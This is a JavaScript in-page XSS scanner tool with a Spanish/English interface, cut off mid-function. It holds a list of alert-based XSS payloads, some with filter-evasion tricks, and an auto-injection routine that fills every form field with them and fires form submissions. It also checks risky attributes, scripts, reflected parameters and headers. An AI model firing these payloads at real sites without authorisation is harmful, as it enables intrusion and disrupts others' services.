(async function () {
  // ==============================
  // CONFIGURACIÓN
  // ==============================
  const TRADUCCIONES = {
    es: {
      scannerTitle: "🚨 Escáner XSS Avanzado v7",
      realTime: "Tiempo real",
      severity: "Severidad",
      element: "Elemento",
      detail: "Detalle",
      copy: "Copiar",
      copied: "¡Copiado!",
      exportJSON: "Exportar JSON",
      exportCSV: "Exportar CSV",
      copySummary: "Copiar Resumen",
      rescan: "Re-escaneo",
      autoInject: "Inyección Automática",
      domAudit: "Auditoría DOM",
      domChanges: "Cambios DOM",
      close: "Cerrar",
      scanStatus: "Preparado para escanear...",
      scanComplete: "Escaneo completado. {count} hallazgos.",
      noFields: "No se encontraron campos para inyectar",
      injectionWarning: "La inyección automática puede afectar la funcionalidad del sitio. ¿Continuar?",
      payloadAdded: "Payload agregado",
      injectionError: "Error al inyectar",
      submissionError: "Error al enviar",
      autoInjectionFailed: "Fallo en inyección automática",
      scanFailed: "Fallo en el escaneo",
      copyError: "Error al copiar",
      realTimeActivated: "Escaneo en tiempo real activado",
      realTimeStopped: "Escaneo en tiempo real detenido",
      domHighlighted: "Elementos vulnerables resaltados en la página",
      dangerousAttrHighlighted: "Atributo peligroso resaltado",
      spaVulnDetected: "Uso de dangerouslySetInnerHTML o [innerHTML] detectado",
      formSubmissionAttempt: "Intento de envío automático de formulario",
      noScripts: "No se encontraron scripts en la página",
      noParams: "No se encontraron parámetros en la URL",
      noEditableFields: "No se encontraron campos editables o formularios",
    },
    en: {
      scannerTitle: "🚨 Advanced XSS Scanner v7",
      realTime: "Real-time",
      severity: "Severity",
      element: "Element",
      detail: "Detail",
      copy: "Copy",
      copied: "Copied!",
      exportJSON: "Export JSON",
      exportCSV: "Export CSV",
      copySummary: "Copy Summary",
      rescan: "Re-scan",
      autoInject: "Auto Injection",
      domAudit: "DOM Audit",
      domChanges: "DOM Changes",
      close: "Close",
      scanStatus: "Ready to scan...",
      scanComplete: "Scan completed. {count} findings.",
      noFields: "No fields found for injection",
      injectionWarning: "Automatic injection may affect site functionality. Continue?",
      payloadAdded: "Payload added",
      injectionError: "Injection error",
      submissionError: "Submission error",
      autoInjectionFailed: "Automatic injection failed",
      scanFailed: "Scan failed",
      copyError: "Copy error",
      realTimeActivated: "Real-time scanning activated",
      realTimeStopped: "Real-time scanning stopped",
      domHighlighted: "Vulnerable elements highlighted on the page",
      dangerousAttrHighlighted: "Dangerous attribute highlighted",
      spaVulnDetected: "dangerouslySetInnerHTML or [innerHTML] detected",
      formSubmissionAttempt: "Attempted automatic form submission",
      noScripts: "No scripts found on the page",
      noParams: "No parameters found in the URL",
      noEditableFields: "No editable fields or forms found",
    }
  };

  let idioma = navigator.language.startsWith("es") ? "es" : "en";
  const PAYLOADS = [
    `<img src=x onerror=alert('{RAND}')>`,
    `"><svg/onload=alert('{RAND}')>`,
    `<iframe src=javascript:alert('{RAND}')>`,
    `<math><mtext></mtext><script>alert('{RAND}')</script></math>`,
    `javascript:/*--><svg/onload=alert('{RAND}')>//`,
    `"><svg><animate onbegin=alert('{RAND}') attributeName=x dur=1s>`,
    `"><body onfocus=alert('{RAND}') tabindex=1>`,
    `<img src=x onerror=confirm('{RAND}')>`,
    `<a href="javascript:alert({RAND})">X</a>`,
    `<iframe srcdoc="<svg onload=alert({RAND})>"></iframe>`,
    `<img src=x onerror=\u0061lert('{RAND}')>`,
    `<svg/onload=\u0063onfirm('{RAND}')>`,
    `"><scr\0ipt>alert('{RAND}')</scr\0ipt>`,
    `<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert('{RAND}')"></div>`,
    `' onmouseover=alert('{RAND}') '`,
    `<body onload=alert('{RAND}')>`,
    `<script>confirm('{RAND}')</script>`,
    `<object data=javascript:alert('{RAND}')>`,
    `<video><source onerror=alert('{RAND}')></video>`,
    `<details open ontoggle=alert('{RAND}')>`,
    `<style>@import 'javascript:alert({RAND})'</style>`,
    `<marquee onstart=alert('{RAND}')>`,
  ];

  let CUSTOM_PAYLOADS = [];
  const ATRIBUTOS_PELIGROSOS = ["onload", "onerror", "onclick", "onmouseover", "onfocus", "onsubmit"];
  const resultados = [];
  const domChangesLog = [];
  let scanInProgress = false;
  let realTimeScanning = false;
  let realTimeObserver = null;

  const generarPayload = () => {
    const todosPayloads = [...PAYLOADS, ...CUSTOM_PAYLOADS];
    return todosPayloads[Math.floor(Math.random() * todosPayloads.length)].replace(
      "{RAND}",
      Math.floor(Math.random() * 99999)
    );
  };

  // ==============================
  // PANEL MEJORADO
  // ==============================
  const panel = document.createElement("div");
  panel.innerHTML = `
    <style>
      #xssScanner {
        position: fixed; top: 0; left: 0; right: 0; max-height: 75vh; overflow: auto;
        background: #111; color: #eee; font-family: monospace; font-size: 13px;
        border-bottom: 3px solid #c00; padding: 15px; z-index: 999999;
        box-shadow: 0 4px 12px rgba(0,0,0,0.5);
      }
      #xssScanner table { width: 100%; border-collapse: collapse; margin-top: 10px; }
      #xssScanner th, #xssScanner td {
        border: 1px solid #555; padding: 6px; text-align: left;
      }
      #xssScanner th { background: #222; }
      .alto { color: #ff5050; font-weight: bold; }
      .medio { color: #ffd700; }
      .info { color: #5bc0de; }
      .bajo { color: #5cb85c; }
      #xssBtns { margin-bottom: 10px; display: flex; flex-wrap: wrap; gap: 6px; }
      #xssBtns button {
        padding: 6px 12px; font-size: 12px; background: #222; color: #fff;
        border: 1px solid #444; cursor: pointer; border-radius: 3px;
        transition: all 0.2s ease;
      }
      #xssBtns button:hover { background: #333; }
      #xssBtns button:disabled { opacity: 0.5; cursor: not-allowed; }
      #xssStatus { margin-top: 10px; font-style: italic; color: #aaa; }
      #xssProgress { width: 100%; height: 4px; background: #333; margin-top: 5px; }
      #xssProgressBar { height: 100%; background: #5cb85c; width: 0%; transition: width 0.3s ease; }
      .copy-btn {
        background: #333; border: none; color: #eee; padding: 2px 6px;
        border-radius: 3px; font-size: 11px; cursor: pointer;
        margin-left: 5px;
      }
      .copy-btn:hover { background: #444; }
      .payload-example {
        background: #222; padding: 4px 8px; border-radius: 3px;
        font-family: monospace; margin: 5px 0; display: inline-block;
      }
      .switch {
        position: relative; display: inline-block; width: 40px; height: 20px;
        margin-left: 10px; vertical-align: middle;
      }
      .switch input { opacity: 0; width: 0; height: 0; }
      .slider {
        position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0;
        background-color: #444; transition: .4s; border-radius: 20px;
      }
      .slider:before {
        position: absolute; content: ""; height: 16px; width: 16px;
        left: 2px; bottom: 2px; background-color: #eee; transition: .4s;
        border-radius: 50%;
      }
      input:checked + .slider { background-color: #5cb85c; }
      input:checked + .slider:before { transform: translateX(20px); }
      .real-time-label { display: flex; align-items: center; }
      .counter-badge {
        display: inline-block; background: #c00; color: white;
        border-radius: 10px; padding: 2px 6px; font-size: 11px;
        margin-left: 5px;
      }
      #customPayload { width: 100%; padding: 6px; margin: 10px 0; }
      #domChangesLog { max-height: 200px; overflow: auto; background: #222; padding: 10px; margin-top: 10px; display: none; }
      .highlight-vulnerable { border: 2px solid #ff5050 !important; position: relative; }
      .highlight-vulnerable::after {
        content: attr(data-vuln); position: absolute; background: #ff5050; color: white;
        padding: 2px 6px; font-size: 10px; top: -20px; left: 0; border-radius: 3px;
      }
    </style>
    <div id="xssScanner" role="region" aria-label="${TRADUCCIONES[idioma].scannerTitle}">
      <h2>${TRADUCCIONES[idioma].scannerTitle} - 
        <span class="real-time-label">${TRADUCCIONES[idioma].realTime}:
          <label class="switch">
            <input type="checkbox" id="realTimeToggle" aria-label="${TRADUCCIONES[idioma].realTime}">
            <span class="slider"></span>
          </label>
          <span id="changesCounter" class="counter-badge" style="display:none">0</span>
        </span>
        <select id="languageSelect" aria-label="Seleccionar idioma">
          <option value="es">Español</option>
          <option value="en">English</option>
        </select>
      </h2>
      <div id="xssBtns">
        <button id="btnExportJSON" aria-label="${TRADUCCIONES[idioma].exportJSON}">${TRADUCCIONES[idioma].exportJSON}</button>
        <button id="btnExportCSV" aria-label="${TRADUCCIONES[idioma].exportCSV}">${TRADUCCIONES[idioma].exportCSV}</button>
        <button id="btnCopyAll" aria-label="${TRADUCCIONES[idioma].copySummary}">${TRADUCCIONES[idioma].copySummary}</button>
        <button id="btnReScan" aria-label="${TRADUCCIONES[idioma].rescan}">${TRADUCCIONES[idioma].rescan}</button>
        <button id="btnAutoInject" aria-label="${TRADUCCIONES[idioma].autoInject}">${TRADUCCIONES[idioma].autoInject}</button>
        <button id="btnDomAudit" aria-label="${TRADUCCIONES[idioma].domAudit}">${TRADUCCIONES[idioma].domAudit}</button>
        <button id="btnDomChanges" aria-label="${TRADUCCIONES[idioma].domChanges}">${TRADUCCIONES[idioma].domChanges} (<span id="domChangesCount">0</span>)</button>
        <button id="btnClose" aria-label="${TRADUCCIONES[idioma].close}">${TRADUCCIONES[idioma].close}</button>
      </div>
      <input type="text" id="customPayload" placeholder="${TRADUCCIONES[idioma].idioma === 'es' ? 'Agregar payload personalizado (e.g., <img src=x onerror=alert(1)>)' : 'Add custom payload (e.g., <img src=x onerror=alert(1)>)'}" aria-label="Payload personalizado">
      <div id="xssStatus">${TRADUCCIONES[idioma].scanStatus}</div>
      <div id="xssProgress"><div id="xssProgressBar"></div></div>
      <table role="grid">
        <thead>
          <tr>
            <th scope="col">${TRADUCCIONES[idioma].severity}</th>
            <th scope="col">${TRADUCCIONES[idioma].element}</th>
            <th scope="col">${TRADUCCIONES[idioma].detail} <button class="copy-btn" id="btnCopyDetails" aria-label="${TRADUCCIONES[idioma].copy}">${TRADUCCIONES[idioma].copy}</button></th>
          </tr>
        </thead>
        <tbody id="tablaXSS"></tbody>
      </table>
      <div id="domChangesLog" role="log" aria-label="${TRADUCCIONES[idioma].idioma === 'es' ? 'Registro de cambios en el DOM' : 'DOM changes log'}"></div>
    </div>`;
  document.body.appendChild(panel);

  // ==============================
  // FUNCIONES AUXILIARES
  // ==============================
  const escapeHtml = (str) => {
    // Simulación de DOMPurify
    const div = document.createElement("div");
    div.textContent = str;
    return div.innerHTML.replace(/[&<>'"]/g, tag => ({
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      "'": '&apos;',
      '"': '&quot;'
    }[tag]));
  };

  const copiarTexto = async (texto) => {
    try {
      if (navigator.clipboard) {
        await navigator.clipboard.writeText(texto);
      } else {
        const textarea = document.createElement("textarea");
        textarea.value = texto;
        document.body.appendChild(textarea);
        textarea.select();
        document.execCommand("copy");
        document.body.removeChild(textarea);
      }
      return true;
    } catch (e) {
      logResultado("info", "Portapapeles", `${TRADUCCIONES[idioma].copyError}: ${e.message}`);
      return false;
    }
  };

  const logResultado = (sev, el, detalle) => {
    const entry = {
      sev,
      el: el.length > 50 ? el.substring(0, 50) + '...' : el,
      detalle: detalle.length > 100 ? detalle.substring(0, 100) + '...' : detalle,
      timestamp: new Date().toISOString(),
      url: window.location.href
    };
    resultados.push(entry);

    const fila = document.createElement("tr");
    fila.innerHTML = `
      <td class="${sev}">${sev.toUpperCase()}</td>
      <td>${entry.el}</td>
      <td>${entry.detalle} <button class="copy-btn" data-content="${escapeHtml(entry.detalle)}" aria-label="${TRADUCCIONES[idioma].copy}">${TRADUCCIONES[idioma].copy}</button></td>
    `;
    const tbody = document.getElementById("tablaXSS");
    tbody.appendChild(fila);
    if (realTimeScanning) {
      fila.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
    }
  };

  const exportarArchivo = (contenido, nombre, tipo) => {
    const blob = new Blob([contenido], { type: tipo });
    const link = document.createElement("a");
    link.href = URL.createObjectURL(blob);
    link.download = nombre;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  const updateProgress = (progress) => {
    document.getElementById("xssProgressBar").style.width = `${progress}%`;
  };

  const actualizarInterfaz = () => {
    document.querySelector("#xssScanner h2").childNodes[0].textContent = TRADUCCIONES[idioma].scannerTitle + " - ";
    document.querySelector(".real-time-label").childNodes[0].textContent = TRADUCCIONES[idioma].realTime + ": ";
    document.getElementById("btnExportJSON").textContent = TRADUCCIONES[idioma].exportJSON;
    document.getElementById("btnExportCSV").textContent = TRADUCCIONES[idioma].exportCSV;
    document.getElementById("btnCopyAll").textContent = TRADUCCIONES[idioma].copySummary;
    document.getElementById("btnReScan").textContent = TRADUCCIONES[idioma].rescan;
    document.getElementById("btnAutoInject").textContent = TRADUCCIONES[idioma].autoInject;
    document.getElementById("btnDomAudit").textContent = TRADUCCIONES[idioma].domAudit;
    document.getElementById("btnDomChanges").textContent = `${TRADUCCIONES[idioma].domChanges} (${domChangesLog.length})`;
    document.getElementById("btnClose").textContent = TRADUCCIONES[idioma].close;
    document.getElementById("customPayload").placeholder = TRADUCCIONES[idioma].idioma === 'es' ? 'Agregar payload personalizado (e.g., <img src=x onerror=alert(1)>)' : 'Add custom payload (e.g., <img src=x onerror=alert(1)>)';
    document.getElementById("xssStatus").textContent = TRADUCCIONES[idioma].scanStatus;
    // Actualizar tabla
    document.querySelector("#xssScanner table thead tr").innerHTML = `
      <th scope="col">${TRADUCCIONES[idioma].severity}</th>
      <th scope="col">${TRADUCCIONES[idioma].element}</th>
      <th scope="col">${TRADUCCIONES[idioma].detail} <button class="copy-btn" id="btnCopyDetails" aria-label="${TRADUCCIONES[idioma].copy}">${TRADUCCIONES[idioma].copy}</button></th>
    `;
  };

  // ==============================
  // INYECCIÓN AUTOMÁTICA
  // ==============================
  const inyeccionAutomatica = async () => {
    if (scanInProgress) {
      alert(TRADUCCIONES[idioma].scanStatus === "Preparado para escanear..." ? "Escaneo en progreso. Por favor espere..." : "Scan in progress. Please wait...");
      return;
    }

    if (!confirm(TRADUCCIONES[idioma].injectionWarning)) {
      return;
    }

    scanInProgress = true;
    document.getElementById("xssStatus").textContent = TRADUCCIONES[idioma].idioma === "es" ? "Inyectando payloads..." : "Injecting payloads...";

    try {
      const campos = document.querySelectorAll("input:not([type=hidden]):not([type=password]), textarea, select, [contenteditable]");
      const total = campos.length;

      if (total === 0) {
        logResultado("info", "Inyección", TRADUCCIONES[idioma].noFields);
        return;
      }

      for (let i = 0; i < campos.length; i++) {
        const campo = campos[i];
        const payload = generarPayload();

        try {
          campo._originalValue = campo.value || campo.innerHTML;
          if (campo.hasAttribute("contenteditable")) {
            campo.innerHTML = payload;
          } else {
            campo.value = payload;
          }

          campo.dispatchEvent(new Event("input", { bubbles: true }));
          campo.dispatchEvent(new Event("change", { bubbles: true }));

          logResultado("medio",
            `${campo.tagName.toLowerCase()}${campo.id ? `#${campo.id}` : ''}${campo.name ? `[name="${campo.name}"]` : ''}`,
            `${TRADUCCIONES[idioma].idioma === "es" ? "Payload inyectado" : "Payload injected"}: <span class="payload-example">${escapeHtml(payload)}</span>`
          );

          campo.classList.add("highlight-vulnerable");
          campo.setAttribute("data-vuln", TRADUCCIONES[idioma].idioma === "es" ? "Campo inyectado" : "Injected field");

          await new Promise(resolve => setTimeout(resolve, 50));
        } catch (e) {
          logResultado("info",
            `${campo.tagName.toLowerCase()}${campo.id ? `#${campo.id}` : ''}`,
            `${TRADUCCIONES[idioma].injectionError}: ${e.message}\nStack: ${e.stack}`
          );
        }

        updateProgress((i / total) * 100);
      }

      const forms = document.querySelectorAll("form");
      for (const form of forms) {
        try {
          form.dispatchEvent(new Event("submit", { bubbles: true, cancelable: true }));
          logResultado("medio", `form${form.id ? `#${form.id}` : ''}`, TRADUCCIONES[idioma].formSubmissionAttempt);
        } catch (e) {
          logResultado("info", `form${form.id ? `#${form.id}` : ''}`, `${TRADUCCIONES[idioma].submissionError}: ${e.message}`);
        }
      }

    } catch (e) {
      logResultado("alto", "Error", `${TRADUCCIONES[idioma].autoInjectionFailed}: ${e.message}\nStack: ${e.stack}`);
    } finally {
      document.querySelectorAll("input, textarea, select, [contenteditable]").forEach(campo => {
        if (campo._originalValue !== undefined) {
          if (campo.hasAttribute("contenteditable")) {
            campo.innerHTML = campo._originalValue;
          } else {
            campo.value = campo._originalValue;
          }
          campo.classList.remove("highlight-vulnerable");
          campo.removeAttribute("data-vuln");
        }
      });
      scanInProgress = false;
      document.getElementById("xssStatus").textContent = TRADUCCIONES[idioma].idioma === "es" ? "Inyección completada" : "Injection completed";
    }
  };

  // ==============================
  // ESCANEO EN TIEMPO REAL
  // ==============================
  const iniciarEscaneoTiempoReal = () => {
    if (realTimeObserver) return;

    let mutationQueue = [];
    let debounceTimeout = null;

    realTimeObserver = new MutationObserver((mutations) => {
      mutationQueue.push(...mutations);
      if (debounceTimeout) clearTimeout(debounceTimeout);
      debounceTimeout = setTimeout(() => {
        mutationQueue.forEach((mutation) => {
          mutation.addedNodes.forEach((node) => {
            if (node.nodeType === Node.ELEMENT_NODE) {
              escanearNuevoElemento(node);
              domChangesLog.push({
                timestamp: new Date().toISOString(),
                type: mutation.type,
                node: `<${node.tagName.toLowerCase()}>`
              });
              document.getElementById("domChangesCount").textContent = domChangesLog.length;
              document.getElementById("changesCounter").style.display = "inline-block";
              document.getElementById("changesCounter").textContent = domChangesLog.length;
            }
          });
        });
        actualizarLogCambiosDOM();
        mutationQueue = [];
      }, 200);
    });

    realTimeObserver.observe(document, {
      childList: true,
      subtree: true,
      attributes: true,
      attributeFilter: ATRIBUTOS_PELIGROSOS
    });

    logResultado("info", "Monitor", TRADUCCIONES[idioma].realTimeActivated);
  };

  const detenerEscaneoTiempoReal = () => {
    if (realTimeObserver) {
      realTimeObserver.disconnect();
      realTimeObserver = null;
      logResultado("info", "Monitor", TRADUCCIONES[idioma].realTimeStopped);
    }
  };

  const actualizarLogCambiosDOM = () => {
    const logContainer = document.getElementById("domChangesLog");
    logContainer.innerHTML = domChangesLog.map(change => 
      `<div>[${change.timestamp}] ${change.type}: ${escapeHtml(change.node)}</div>`
    ).join("");
  };

  const escanearNuevoElemento = (element) => {
    ATRIBUTOS_PELIGROSOS.forEach(attr => {
      if (element.hasAttribute(attr)) {
        logResultado("alto",
          `<${element.tagName.toLowerCase()} ${attr}="...">`,
          `${TRADUCCIONES[idioma].idioma === "es" ? "Atributo peligroso detectado en nuevo elemento" : "Dangerous attribute detected in new element"}: ${attr}`
        );
        element.classList.add("highlight-vulnerable");
        element.setAttribute("data-vuln", `Vulnerabilidad: ${attr}`);
      }
    });

    if (element.tagName.toLowerCase() === 'script') {
      const code = element.textContent || element.innerText;
      if (/eval\s*\(|document\.write\s*\(|setTimeout\s*\(["']/.test(code)) {
        logResultado("alto",
          "script dinámico",
          `${TRADUCCIONES[idioma].idioma === "es" ? "Código peligroso detectado en nuevo script" : "Dangerous code detected in new script"}: ${escapeHtml(code.substring(0, 50))}...`
        );
      }
    }

    element.querySelectorAll("*").forEach(child => {
      escanearNuevoElemento(child);
    });
  };

  // ==============================
  // AUDITORÍA DEL DOM
  // ==============================
  const auditarDOM = () => {
    document.querySelectorAll(".highlight-vulnerable").forEach(el => {
      el.classList.remove("highlight-vulnerable");
      el.removeAttribute("data-vuln");
    });

    document.querySelectorAll("script, input:not([type=hidden]), textarea, [contenteditable], [data-reactid], [data-react], *[ng-bind-html], *[ng-repeat]").forEach(el => {
      Array.from(el.attributes).forEach(attr => {
        if (ATRIBUTOS_PELIGROSOS.includes(attr.name.toLowerCase()) || /javascript:/i.test(attr.value)) {
          el.classList.add("highlight-vulnerable");
          el.setAttribute("data-vuln", `${TRADUCCIONES[idioma].idioma === "es" ? "Vulnerabilidad" : "Vulnerability"}: ${attr.name}=${attr.value.substring(0, 20)}...`);
          logResultado("alto",
            `<${el.tagName.toLowerCase()} ${attr.name}="...">`,
            `${TRADUCCIONES[idioma].dangerousAttrHighlighted}: ${attr.name}`
          );
        }
      });

      if (el.hasAttribute("contenteditable") || el.tagName.toLowerCase() === "input" || el.tagName.toLowerCase() === "textarea") {
        el.classList.add("highlight-vulnerable");
        el.setAttribute("data-vuln", TRADUCCIONES[idioma].idioma === "es" ? "Campo editable" : "Editable field");
      }
    });

    logResultado("info", "Auditoría DOM", TRADUCCIONES[idioma].domHighlighted);
  };

  // ==============================
  // ESCANEO PRINCIPAL
  // ==============================
  const escanearAtributosPeligrosos = () => {
    return new Promise(resolve => {
      setTimeout(() => {
        const elementos = document.querySelectorAll("script, input, textarea, [contenteditable], a, img, svg, iframe");
        const total = elementos.length;
        let procesados = 0;

        elementos.forEach((el) => {
          Array.from(el.attributes).forEach((attr) => {
            if (ATRIBUTOS_PELIGROSOS.includes(attr.name.toLowerCase())) {
              logResultado("alto",
                `<${el.tagName.toLowerCase()} ${attr.name}="...">`,
                `${TRADUCCIONES[idioma].idioma === "es" ? "Atributo de evento potencialmente peligroso" : "Potentially dangerous event attribute"}: ${attr.name}`
              );
            }

            if (/javascript:/i.test(attr.value)) {
              logResultado("alto",
                `<${el.tagName.toLowerCase()} ${attr.name}="...">`,
                `${TRADUCCIONES[idioma].idioma === "es" ? "Atributo con código JavaScript" : "Attribute with JavaScript code"}: ${attr.name}="${attr.value.substring(0, 50)}${attr.value.length > 50 ? '...' : ''}"`
              );
            }
          });

          procesados++;
          updateProgress((procesados / total) * 25);
        });
        resolve();
      }, 0);
    });
  };

  const escanearCamposEditables = () => {
    return new Promise(resolve => {
      setTimeout(() => {
        const campos = document.querySelectorAll("[contenteditable], input:not([type=hidden]), textarea, select");
        const total = campos.length;

        if (total === 0) {
          logResultado("bajo", "Campos editables", TRADUCCIONES[idioma].noEditableFields);
          resolve();
          return;
        }

        campos.forEach((el, index) => {
          logResultado("medio",
            `${el.tagName.toLowerCase()}${el.id ? `#${el.id}` : ''}${el.name ? `[name="${el.name}"]` : ''}`,
            `${TRADUCCIONES[idioma].idioma === "es" ? "Campo editable potencialmente vulnerable" : "Potentially vulnerable editable field"}`
          );
          updateProgress(25 + ((index / total) * 25));
        });
        resolve();
      }, 0);
    });
  };

  const escanearScriptsInseguros = () => {
    return new Promise(resolve => {
      setTimeout(() => {
        const scripts = document.querySelectorAll("script");
        const total = scripts.length;

        if (total === 0) {
          logResultado("bajo", "Scripts", TRADUCCIONES[idioma].noScripts);
          resolve();
          return;
        }

        scripts.forEach((s, index) => {
          try {
            const code = s.innerText || s.textContent;
            if (!code.trim()) return;

            const patronesPeligrosos = [
              { pattern: /eval\s*\(/, desc: "Uso de eval()" },
              { pattern: /document\.write\s*\(/, desc: "Uso de document.write()" },
              { pattern: /setTimeout\s*\(["']/, desc: "setTimeout con string" },
              { pattern: /setInterval\s*\(["']/, desc: "setInterval con string" },
              { pattern: /new Function\s*\(/, desc: "Constructor Function()" },
              { pattern: /innerHTML\s*=\s*["']<[^>]*>/, desc: "Asignación directa de HTML" }
            ];

            patronesPeligrosos.forEach(patron => {
              if (patron.pattern.test(code)) {
                logResultado("alto",
                  "inline script",
                  `${patron.desc} detectado: ${escapeHtml(code.substring(0, 100))}${code.length > 100 ? '...' : ''}`
                );
              }
            });
          } catch (e) {
            logResultado("info", "script", `${TRADUCCIONES[idioma].idioma === "es" ? "Error al analizar script" : "Error analyzing script"}: ${e.message}`);
          }

          updateProgress(50 + ((index / total) * 25));
        });
        resolve();
      }, 0);
    });
  };

  const escanearParametrosReflejados = () => {
    return new Promise(resolve => {
      setTimeout(() => {
        const params = new URLSearchParams(location.search + location.hash);
        const total = params.size;

        if (total === 0) {
          logResultado("bajo", "Parámetros URL", TRADUCCIONES[idioma].noParams);
          resolve();
          return;
        }

        let procesados = 0;
        params.forEach((val, key) => {
          if (val && document.body.innerHTML.includes(val) && !document.body.innerHTML.includes(escapeHtml(val))) {
            logResultado("alto",
              `Parámetro ?${key}=...`,
              `${TRADUCCIONES[idioma].idioma === "es" ? "Valor reflejado en el DOM sin sanitizar" : "Value reflected in DOM without sanitization"}: "${escapeHtml(val.substring(0, 50))}${val.length > 50 ? '...' : ''}"`
            );
          }
          procesados++;
          updateProgress(75 + ((procesados / total) * 25));
        });
        resolve();
      }, 0);
    });
  };

  const escanearSPAs = () => {
    return new Promise(resolve => {
      setTimeout(() => {
        const elementos = document.querySelectorAll("[data-reactid], [data-react], *[ng-bind-html], *[ng-repeat]");
        elementos.forEach((el, index) => {
          if (el.innerHTML.includes("dangerouslySetInnerHTML") || el.innerHTML.includes("[innerHTML]")) {
            logResultado("alto",
              `<${el.tagName.toLowerCase()}${el.id ? `#${el.id}` : ''}>`,
              TRADUCCIONES[idioma].spaVulnDetected
            );
            el.classList.add("highlight-vulnerable");
            el.setAttribute("data-vuln", TRADUCCIONES[idioma].idioma === "es" ? "Vulnerabilidad SPA" : "SPA Vulnerability");
          }
          updateProgress(90 + ((index / elementos.length) * 5));
        });
        resolve();
      }, 0);
    });
  };

  const verificarCabecerasSeguridad = async () => {
    try {
      updateProgress(95);
      const res = await fetch(location.href, { method: "HEAD" });

      const csp = res.headers.get("content-security-policy") || res.headers.get("x-content-security-policy");
      if (!csp) {
        logResultado("alto", "Cabeceras", `${TRADUCCIONES[idioma].idioma === "es" ? "No se encontró Content-Security-Policy" : "Content-Security-Policy not found"}`);
      } else {
        const cspStrong = /script-src [''](none|self)/i.test(csp) ?
          TRADUCCIONES[idioma].idioma === "es" ? "Configuración fuerte de CSP" : "Strong CSP configuration" :
          TRADUCCIONES[idioma].idioma === "es" ? "Configuración débil de CSP" : "Weak CSP configuration";
        logResultado(cspStrong.includes("débil") || cspStrong.includes("Weak") ? "medio" : "bajo",
          "CSP",
          `${cspStrong}: ${csp.substring(0, 100)}${csp.length > 100 ? '...' : ''}`
        );
      }

      const xssProtection = res.headers.get("x-xss-protection");
      if (!xssProtection) {
        logResultado("medio", "Cabeceras", `${TRADUCCIONES[idioma].idioma === "es" ? "No se encontró X-XSS-Protection" : "X-XSS-Protection not found"}`);
      } else {
        logResultado("bajo", "X-XSS-Protection", xssProtection);
      }

      const contentTypeOpts = res.headers.get("x-content-type-options");
      if (!contentTypeOpts) {
        logResultado("medio", "Cabeceras", `${TRADUCCIONES[idioma].idioma === "es" ? "No se encontró X-Content-Type-Options" : "X-Content-Type-Options not found"}`);
      } else {
        logResultado("bajo", "X-Content-Type-Options", contentTypeOpts);
      }

    } catch (e) {
      logResultado("info", "Cabeceras", `${TRADUCCIONES[idioma].idioma === "es" ? "Error al verificar cabeceras" : "Error checking headers"}: ${e.message}`);
    }
    updateProgress(100);
  };

  const iniciarEscaneo = async () => {
    if (scanInProgress) return;
    scanInProgress = true;

    document.getElementById("xssStatus").textContent = TRADUCCIONES[idioma].scanStatus;
    document.getElementById("tablaXSS").innerHTML = "";

    try {
      await escanearAtributosPeligrosos();
      await escanearCamposEditables();
      await escanearScriptsInseguros();
      await escanearParametrosReflejados();
      await escanearSPAs();
      await verificarCabecerasSeguridad();

      const count = resultados.reduce((acc, curr) => {
        acc[curr.sev] = (acc[curr.sev] || 0) + 1;
        return acc;
      }, {});

      logResultado("info", "Resumen", `
        ${TRADUCCIONES[idioma].idioma === "es" ? "Escaneo completado" : "Scan completed"}. 
        ${TRADUCCIONES[idioma].idioma === "es" ? "Hallazgos" : "Findings"}:
        🔴 Alto: ${count.alto || 0}
        🟡 Medio: ${count.medio || 0}
        🔵 Bajo: ${count.bajo || 0}
        ℹ️ Info: ${count.info || 0}
      `);

    } catch (e) {
      logResultado("alto", "Error", `${TRADUCCIONES[idioma].scanFailed}: ${e.message}\nStack: ${e.stack}`);
    } finally {
      scanInProgress = false;
      document.getElementById("xssStatus").textContent = TRADUCCIONES[idioma].scanComplete.replace("{count}", resultados.length);
    }
  };

  // ==============================
  // EVENTOS DE BOTONES
  // ==============================
  document.getElementById("btnExportJSON").onclick = () => {
    exportarArchivo(
      JSON.stringify(resultados, null, 2),
      `xss_scan_${new Date().toISOString().replace(/[:.]/g, '-')}.json`,
      "application/json"
    );
  };

  document.getElementById("btnExportCSV").onclick = () => {
    const csvHeaders = ["timestamp", "url", "sev", "el", "detalle"];
    const csv = [
      csvHeaders.join(","),
      ...resultados.map(r => csvHeaders.map(k => `"${r[k] ? r[k].toString().replace(/"/g, '""') : ''}"`).join(","))
    ].join("\n");
    exportarArchivo(
      csv,
      `xss_scan_${new Date().toISOString().replace(/[:.]/g, '-')}.csv`,
      "text/csv"
    );
  };

  document.getElementById("btnCopyAll").onclick = async () => {
    const summary = resultados.map(r =>
      `[${r.sev.toUpperCase()}] ${r.el}: ${r.detalle}`
    ).join("\n");
    if (await copiarTexto(summary)) {
      alert(TRADUCCIONES[idioma].idioma === "es" ? "Resumen copiado al portapapeles" : "Summary copied to clipboard");
    }
  };

  document.getElementById("btnCopyDetails").onclick = async () => {
    const details = resultados.map(r => r.detalle).join("\n\n");
    if (await copiarTexto(details)) {
      document.getElementById("btnCopyDetails").textContent = TRADUCCIONES[idioma].copied;
      setTimeout(() => {
        document.getElementById("btnCopyDetails").textContent = TRADUCCIONES[idioma].copy;
      }, 2000);
    }
  };

  document.getElementById("tablaXSS").addEventListener("click", async (e) => {
    if (e.target.classList.contains("copy-btn")) {
      const content = e.target.getAttribute("data-content");
      if (await copiarTexto(content)) {
        e.target.textContent = TRADUCCIONES[idioma].copied;
        setTimeout(() => {
          e.target.textContent = TRADUCCIONES[idioma].copy;
        }, 2000);
      }
    }
  });

  document.getElementById("btnReScan").onclick = () => {
    if (scanInProgress) {
      alert(TRADUCCIONES[idioma].scanStatus === "Preparado para escanear..." ? "Escaneo en progreso. Por favor espere..." : "Scan in progress. Please wait...");
      return;
    }
    document.getElementById("tablaXSS").innerHTML = "";
    resultados.length = 0;
    iniciarEscaneo();
  };

  document.getElementById("btnAutoInject").onclick = inyeccionAutomatica;

  document.getElementById("btnDomAudit").onclick = auditarDOM;

  document.getElementById("btnDomChanges").onclick = () => {
    const logContainer = document.getElementById("domChangesLog");
    logContainer.style.display = logContainer.style.display === "none" ? "block" : "none";
  };

  document.getElementById("btnClose").onclick = () => {
